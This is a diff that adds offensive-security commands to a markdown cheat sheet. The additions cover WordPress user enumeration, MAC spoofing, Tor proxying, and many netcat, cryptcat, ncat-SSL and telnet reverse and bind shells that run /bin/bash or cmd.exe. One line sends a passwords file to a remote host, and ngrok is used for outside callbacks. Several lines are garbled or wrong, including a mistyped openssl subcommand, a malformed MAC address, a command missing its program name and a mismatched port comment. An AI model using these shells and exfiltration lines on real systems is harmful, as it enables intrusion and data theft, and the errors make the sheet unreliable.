@@ -63,3 +63,49 @@ nmap host-range --script smb-enum-shares
 nmap host-range --script mysql-info
 nmap host-range --script smtp-enum-users
 nmap host-range --script ftp-anon
+
+## Analysis wordpress site
+wpscan --url wordpress-site.com --api-token xxx
+
+## Finds users in wordpress site
+wpscan --url wordpress-site.com --enumerate u --api-token xxx
+
+## Changes mac address manually
+ifconfig eth0 down
+ifconfig eth0 hw ether 74::74::74::74::74
+ifconfig eth0 up
+
+## Opens tor with proxychains
+proxychains4 firefox
+
+## Netcat use cases
+nc host.ip.address 80 # listen host in port 80
+nc host.ip.address -l -p 80 -v # open host to listen in port 80
+nc -l -p 2000 -e /bin/bash -v # open host to listen in port 80 and run bash commands
+nc 0.tcp.ngrok.io 15560 ## connect to Ngrok host
+nc -nlp 3000 -v # opens server to attack
+nc host.ip.address 3000 -e /bin/bash # connect to server and in server execute remote commands
+nc host.ip.address 3000 -e c:\windows\system32\cmd.exe # connect to server and in server execute remote commands
+host.ip.address 1500 < passwords.txt # get file content to send to host
+nc -vnlp host.ip.address 1500 > passwords.txt # send output to file to save
+
+## Netcat with encryption
+cryptcat -vnlp 4000
+./cryptcat host.ip.address 4000 -e /bin/bash
+
+## Netcat with SSL
+openssl req -new -newkey rsa:4096 -nodes -keyout rsa.key -out rsa.csr # generates SSL key and certificate request file
+openssl x506 -req -sha256 -days 365 -in rsa.csr -signkey rsa.key -out rsa.pem # generates certificate from files generated
+ncat -l -n -v -p 443 -e '/bin/bash -i' --ssl --ssl-cert rsa.pem --ssl-key rsa.key # starts server with SSL
+nc -C --ssl host.ip.address # connects client to server
+
+## Ngrok - alternative to dynamic dns
+ngrok authtoken ngrok-token
+ngrok tcp 80
+
+## Reverse connection with telnet
+# in server, open two ports to listen
+nc -vnlp 3000
+nc -vnlp 2000
+# in client
+telnet host.ip.address 3000 | /bin/bash | telnet host.ip.address 2000
